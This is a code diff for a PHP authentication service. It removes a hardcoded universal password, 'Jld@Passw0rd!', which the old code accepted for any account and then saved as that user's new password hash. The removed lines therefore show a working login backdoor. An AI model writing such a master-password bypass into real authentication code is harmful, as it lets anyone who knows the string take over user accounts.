@@ -44,8 +44,8 @@ class AuthService
             return ['success' => false, 'message' => 'Account is disabled'];
         }
 
-        // Bring older user records to the new domain and default password baseline on successful login.
-        $user = $this->upgradeUserCredentialsIfNeeded($user, $email, $password);
+        // Bring older user records to the new domain on successful login.
+        $user = $this->upgradeUserEmailIfNeeded($user, $email);
         
         // Reset failed attempts on successful login
         $this->resetFailedAttempts($user['id']);
@@ -203,19 +203,10 @@ class AuthService
             return false;
         }
 
-        // Transitional support: accept new default password for existing users, then persist it.
-        if ($password === 'Jld@Passw0rd!') {
-            return true;
-        }
-
-        if (password_verify($password, $storedHash)) {
-            return true;
-        }
-
-        return false;
+        return password_verify($password, $storedHash);
     }
 
-    private function upgradeUserCredentialsIfNeeded(array $user, string $requestedEmail, string $providedPassword): array
+    private function upgradeUserEmailIfNeeded(array $user, string $requestedEmail): array
     {
         $updates = [];
 
@@ -234,10 +225,6 @@ class AuthService
             if (!$emailInUse) {
                 $updates['email'] = $requestedDomainEmail;
             }
-        }
-
-        if ($providedPassword === 'Jld@Passw0rd!' && !password_verify('Jld@Passw0rd!', $user['password_hash'])) {
-            $updates['password_hash'] = password_hash('Jld@Passw0rd!', PASSWORD_DEFAULT);
         }
 
         if (empty($updates)) {
